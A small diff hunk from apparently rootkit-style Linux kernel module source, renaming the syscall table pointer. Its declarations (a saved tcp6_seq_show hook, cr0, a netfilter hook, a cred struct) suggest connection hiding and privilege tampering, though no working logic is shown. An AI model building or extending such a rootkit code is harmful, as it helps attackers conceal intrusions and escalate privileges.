@@ -18,7 +18,7 @@
 	static asmlinkage int (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
 	
 	unsigned long cr0;
-	static unsigned long *sys_call_table;
+	static unsigned long *g_syscall_table;
 	static struct nf_hook_ops *nfho = NULL;
 	struct cred *cred;
 	char *kpathname;
